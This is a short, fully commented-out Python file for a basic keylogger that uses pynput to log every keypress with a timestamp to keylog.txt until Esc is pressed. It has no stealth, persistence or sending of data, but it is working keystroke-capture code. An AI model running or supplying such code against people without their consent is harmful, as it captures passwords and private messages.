#import logging
#from pynput.keyboard import Key, Listener

#log_dir = ""
#logging.basicConfig(filename=(log_dir + "keylog.txt"), level=logging.DEBUG, format='%(asctime)s: %(message)s')

#def on_press(key):
 #   try:
  #      logging.info(str(key))
   # except Exception as e:
    #    logging.error("Error: {0}".format(e))
#
#def on_release(key):
 #   if key == Key.esc:
  #      return False

#with Listener(on_press=on_press, on_release=on_release) as listener:
 #   listener.join()
